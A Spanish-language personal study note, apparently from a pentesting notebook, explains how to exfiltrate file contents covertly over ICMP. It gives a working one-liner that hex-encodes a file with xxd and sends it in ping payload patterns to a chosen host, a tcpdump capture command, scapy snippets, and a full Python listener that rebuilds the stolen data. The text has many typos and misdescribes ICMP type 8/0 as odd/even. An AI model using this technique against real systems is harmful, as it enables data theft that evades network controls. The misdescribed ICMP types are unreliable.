----
- Tags: #teoria #practica 
----

# IMCP (Internet Menssager  Control Protocol)

El protoclo de mansajes de control de internet o **ICMP** es parte del conjutno del protocolo IP. Es utilizado para enciar mensajes de error e información operatia. 

-----

# Exfiltración de data 

Existe una técnica muy interesante para exfiltrar data haciendo uso de la herramienta **ping** y utilidades en python como el modulo **scapy** (pip3 install scapy), esto quiere decir que seríamos capaz de envíar el contenido de todo un archivo mediante traszas icmp para posteriormente hacinedo uso de **scapy** obtener su contenido.

----

# Concepto 

La herramienta **ping** tiene un parametro el cual es **-p** que nos permite envíar un patrón personalizado que se envía en los paquetes de solicitud de ping. Mayormente se utiliza para verificar la integridad de los paquetes de respuesta recibidos. Cada vez qeu se envía un paquede de ping con un patrón personalizado, el sistema receptor debería devolver un paquete de respuesta que coincida con el patrón enviado. 

Por lo que entendemos, este patrón puede ser **personalizado**, permitiendonos así envíar valores hexadecimales que querramos. 

Por otro lado, la herramienta **xxd** nos permite pasar valores a hexadecimal, esta herramienta puede transformar a hexadecimal un archivo completo e incluso separarlo en partes, es decir, de 4 en 4, de 5 en 5, de 20 en 20, como querramos. 

Si juntamos estos dos conceptos, la idea sería transformar un archivo en hexadecimal alternandolo en valores (Recomendado de 4 en 4) para recorrer cada par de estos 4 bytes y envíar una traza icmp con el patrón que corresponde a estos 4 bytes que íran alternando del archivo que se busca leer, para que de manera posterior con un script en python, haciendo uso de **scapy** poder transformar todas estas trazas a el contenido original del archivo. 

----

# Exfiltracion de data 

- ## Envío y recibimiento de trazas icmp 

Como vimos, lo primero sería leer todo el archivo para separarlo en pares de 4 bytes y posteriormente envíar trazas icmp con el valor de estos bytes como patrón. 

```bash
xxd -p -c 4 {file_to_read} | while read line; do ping -c 1 -p $line {ip}; done 

for line in $(xxd -p -c 4 {file_to_read}); do ping -c 1 -p $line {ip}; done
```

De manera alterna, previo a realizar esto, deberíamos estar almacenando todas las trazas icmp envíadas en un archivo de captura. 

```bash
sudo tcpdump -i {interfaz} icmp -n -v -w Captura.cap
```

De esta manera estaremos en escucha de todas las trazas icmp recibidas por una determinada interfaz y estaremos alojando todas estas en un archivo llamado **Captura.cap** 

Una vez realizado esto ya tendríamos todas las trazas almacenadas listas para ser leidas y obtener la información de interez en el patrón de cada una de estas, para eso usarémos **scapy**. 

-----

- ## Scapy

Para leer un archivo con scapy podrémos hacer uso de la función **rdpcap**, posteriormente para ver cada paquete podríamos guardar el contenido arrojado de la función rdpcac en una variable la cual se convertirá en un array donde cada posición corresponde a un paquete. De esta manera pudiendo acceder a cada paquete, cada uno de estos contiene **layers** como Ether, IP, ICMP, etc. de manera que podríamos acceder a layers para acercarnos más a la información que nos interesa. Una vez que seleccionamos una layer podríamos listar con la función **ls** los atributos de las layers así como acceder a los atributos de las layers. 

```python
from scapy.all import *

packets = rdpcap("{path_file_.cap}")

# Acceder a distintos paquetes 
print(packets[0])

# Acceder a una layer de un paquete 
packets[0][ICMP]

# Listar los atributos de las layers
ls(packets[0][ICMP])

# Acceder a un atributo 
packets[0][ICMP].load
```

En la layer **ICMP** atributo **load** tendríamos los patrónes envíados a travez de cada una de las trazas icmp transmitidas. Ahora, es **importante** tener en cuenta que los paquetes van a estar repetidos como también puede ser que no contenga la layer ICMP, de manera que para poder listar los contenidos de manera correcta nos deberíamos asegurar de que los paquetes no se repitan, esto lo podríamos realizar con la función **.type** la cual devuelce 8 o 0 dependiendo de si es impar o par. Mientras que el asegurarnos de que el paquete tenga la layer ICMP lo podemos hacer con la función **.haslayer**. 

```bash
# ........

# Verificar el tipo del paquete, si es par o impar
packet[0].type

# Verificar si el primer paquete tiene una determinada layer
packet[0].haslayer(ICMP)
```

De esta manera podríamos utilizar toda esta información para realizar un script en python el cual se encargue de leer un archivo .cap y arrojarnos la información gracias a acceder a todos los patrónes de cada una de las trazas icmp alojadas en el archivo. 

```python
from scapy.all import * 
import signal, sys, readline, os

# Configuration 

readline.parse_and_bind("set editing-mode emacs")

# Ctrl + c

def ctrl_c(sig, frame):
    print("\n\n\t[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c) 

# Data exfiltration

def sniffTrafic(interface):
    print("\n[+] Your file content: \n")
    sniff(iface=interface, prn=readICMPpatterns)
    

def readICMPpatterns(packet): 
    
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        line = packet[ICMP].load[-4:].decode('utf-8')
        print(line, flush=True, end='')


if __name__ == "__main__": 
    
    if os.geteuid() == 0:
        interface = input("\n\t[!] Please insert the interface to listen: ")
        sniffTrafic(interface) 
    else: 
        print("\n\n\t[!] Please run the script as root ツ\n\n")

```